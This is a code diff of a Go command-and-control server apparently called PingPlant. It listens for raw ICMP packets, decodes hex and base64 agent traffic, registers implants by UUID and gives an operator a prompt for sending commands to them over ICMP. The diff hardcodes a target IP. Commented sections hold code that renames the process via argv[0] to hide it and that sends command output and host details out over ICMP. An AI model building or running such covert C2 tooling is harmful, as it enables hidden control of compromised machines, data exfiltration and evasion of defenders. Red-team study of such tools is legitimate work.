@@ -33,16 +33,20 @@ import (
 
 // targetIP is the const variable of the IP to send data to
 // TODO: Change to whatever agent you are interacting with
-const targetIP = "10.2.175.74"
-const secretMessage = "Activate"
+const targetIP = "10.10.100.155"
+
+// To be used as an egg later
+//const secretMessage = "Activate"
 
 var agentChoice []string
 var activeAgent string
-var conn *net.IPConn
+var conn *icmp.PacketConn
+var listenErr error
+var buf = make([]byte, 40000)
 
 var Agents = make(map[uuid.UUID]*Agent)
 
-// Agent is a server side structure that holds information about a Merlin Agent
+// Agent is a server side structure that holds information about a PingPlant Agent
 type Agent struct {
 	ID       uuid.UUID
 	Platform string
@@ -61,33 +65,29 @@ func validateOptions(slice []string, val string) bool {
 	}
 	return false
 }
-
-func ReadData(buf []byte, packetData int) {
+func ReadData(packetData string) {
+	//func ReadData(readbuf []byte, packetData int) {
 	var firstCallback = true
-	src := buf[8:packetData]
+	//src := readbuf[8:packetData]
 
-	hexToString := hex.EncodeToString(src)
+	//hexToString := hex.EncodeToString(src)
 
-	hexDecode, _ := hex.DecodeString(hexToString)
-	//log.Info().Bytes("Data", hexDecode).Msg("hexDecode")
+	hexDecode, _ := hex.DecodeString(packetData)
 
 	base64Text := make([]byte, base64.StdEncoding.DecodedLen(len(hexDecode)))
 
 	decode, _ := base64.StdEncoding.Decode(base64Text, []byte(hexDecode))
 
 	agentData := base64Text[:decode]
-	//log.Info().Bytes("Data", agentData).Msg("agentData from ReadData")
 
 	// if data contains uuid
 	initialUuid, inituuidErr := uuid.FromString(string(agentData))
 	if inituuidErr != nil {
-		//log.Error().Err(inituuidErr).Msg("Error on inituuidErr")
 		firstCallback = false
 	}
 	if firstCallback {
 		_, _ = NewAgentCallback(initialUuid)
 	} else {
-		//log.Info().Str("Response", string(agentData)).Msg("Received Response from Host")
 		data := [][]string{
 			{string(agentData)},
 		}
@@ -99,13 +99,13 @@ func ReadData(buf []byte, packetData int) {
 		table.SetHeaderLine(true)
 		table.AppendBulk(data)
 		//for _, v := range data {
-		//		table.Append(v)
-		//			fmt.Println(v)
-		//		}
+		//	table.Append(v)
+		//}
 		fmt.Println()
 		table.Render()
 		color.Set(color.FgGreen)
 		fmt.Printf("[%s] PingPlant >> ", activeAgent)
+		color.Unset()
 	}
 	return
 
@@ -126,40 +126,53 @@ func isAgent(agentID uuid.UUID) bool {
 // in which it will then execute the command it received, encode it, and send it out
 // Added a chunking portion that handles large data outputs
 func PingListen() {
+
+	conn, listenErr = icmp.ListenPacket("ip4:icmp", "0.0.0.0")
+	if listenErr != nil {
+		fmt.Println(listenErr)
+	}
+	defer conn.Close()
+
 	for {
-		protocol := "icmp"
-
-		netaddr, err := net.ResolveIPAddr("ip4", "0.0.0.0")
-		if err != nil {
-			fmt.Printf("[-] Error in Resolve IPAddr: %s\n\n", err)
-		}
-		conn, err = net.ListenIP("ip4:"+protocol, netaddr)
-		if err != nil {
-			fmt.Printf("[-] Error in ListenIP: %s\n\n", err)
+		n, _, er := conn.ReadFrom(buf)
+		if er != nil {
+			fmt.Println(er)
 		}
 
-		buf := make([]byte, 100000)
-
-		packetData, _, err := conn.ReadFrom(buf)
+		rm, err := icmp.ParseMessage(1, buf[:n])
 		if err != nil {
-			fmt.Printf("[+] Error reading packet data, %s\n\n", err)
+			fmt.Println(err)
 		}
-		log.Info().Int("PingListen", packetData)
-		ReadData(buf, packetData)
 
-		// This means new agent has called back
-		//agent, agentErr := NewAgentCallback(packetData)
-		//if agentErr != nil {
-		//	log.Error().Str("Error from PingListen", agentErr.Error())
+		body, _ := rm.Body.Marshal(0)
+		packetStr := fmt.Sprintf("%x", body)
+
+		packetData := packetStr[8:]
+		ReadData(packetData)
+		//protocol := "icmp"
+		//
+		//netaddr, err := net.ResolveIPAddr("ip4", "0.0.0.0")
+		//if err != nil {
+		//	fmt.Printf("[-] Error in Resolve IPAddr: %s\n\n", err)
 		//}
-		//log.Info().Str("AgentData From PingListen", (agent.ID).String())
+		//conn, err = net.ListenIP("ip4:"+protocol, netaddr)
+		//if err != nil {
+		//	fmt.Printf("[-] Error in ListenIP: %s\n\n", err)
+		//}
+
+		//packetData, err := conn.Read(buf)
+		//packetData, _, err := conn.ReadFrom(buf)
+		//if err != nil {
+		//	fmt.Printf("[+] Error reading packet data, %s\n\n", err)
+		//}
+		//log.Info().Int("PingListen", packetData)
+
 	}
 }
 
 func NewAgentCallback(agentUUID uuid.UUID) (Agent, error) {
 	var agent Agent
 
-	//agentUuid, _ := uuid.FromString(string(agentUUIDString))
 	log.Info().Str("Agent ID", (agentUUID).String()).Msg("New Agent Checked In!")
 	if isAgent(agentUUID) {
 		return agent, fmt.Errorf("the %s agent already exists", agentUUID)
@@ -188,7 +201,10 @@ func SendData(data string, seq int) {
 		},
 	}
 
+	fmt.Println(data)
+	fmt.Println([]byte(data))
 	wb, err := wm.Marshal(nil)
+	fmt.Println(wb)
 	if err != nil {
 		log.Fatal().AnErr("Marshal Error", err)
 	}
@@ -270,7 +286,11 @@ func main() {
 				Options: agents,
 			}
 
-			survey.AskOne(prompt, &activeAgent)
+			askErr := survey.AskOne(prompt, &activeAgent)
+			if askErr != nil {
+				fmt.Println(askErr)
+				return
+			}
 
 			for {
 				reader := bufio.NewReader(os.Stdin)
@@ -287,60 +307,21 @@ func main() {
 			}
 		}
 
-		/*			for {
-						reader := bufio.NewReader(os.Stdin)
-						color.Set(color.FgGreen)
-						fmt.Print("PingPlant/Interact >> ")
-						color.Unset()
-						text, _ := reader.ReadString('\n')
-						text = strings.Replace(text, "\n", "", -1)
-						text = strings.Replace(text, "\r", "", -1)
+		/*
+			// ChangeProcName() is a function that hooks argv[0] and renames it
+			// This will stand out to filesystem analysis such as lsof and the /proc directory
+			func ChangeProcName(name string) error {
+				argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
+				argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]
 
-						if strings.Contains(text, "agent") {
-							agentChoice = strings.Split(text, "agent ")
-							activeAgent = strings.Join(agentChoice[1:], "")
-							break
-						}
-					}
+				n := copy(argv0, name)
+				if n < len(argv0) {
+					argv0[n] = 0
+				}
 
-					for {
-						reader := bufio.NewReader(os.Stdin)
-						color.Set(color.FgGreen)
-						fmt.Printf("[%s] PingPlant >> ", activeAgent)
-						color.Unset()
-						text, _ := reader.ReadString('\n')
-						text = strings.Replace(text, "\n", "", -1)
-						text = strings.Replace(text, "\r", "", -1)
-
-						data := EncodeData(text)
-						SendData(data, 3)
-
-					}*/
-
-		//hostnameOption := flag.Bool("hostname", false, "")
-		//userOption := flag.Bool("username", false, "")
-		//commandOption := flag.String("command", "", "Command to run. Results will be sent to target over ICMP")
-
-		//flag.Parse()
-
-		//if *hostnameOption {
-		//		hostname := GetHostname()
-		//		SendData(hostname, 1)
-		//	}
-
-		//	if *userOption {
-		//		userDir := GetDir()
-		//		SendData(userDir, 2)
-		//	}
-
-		//	if *commandOption != "" {
-		//		min := 0
-		//		max := 700
-		//		rand.Seed(time.Now().UnixNano())
-		//		seq := rand.Intn(max-min+1) + min
-		//		//output, _ := exec.Command("powershell.exe", "/c", *commandOption).Output()
-		//		encodedCommand := EncodeData([]byte(*commandOption))
-		//		SendData(encodedCommand, seq)
+				return nil
+			}
+		*/
 
 	}
 
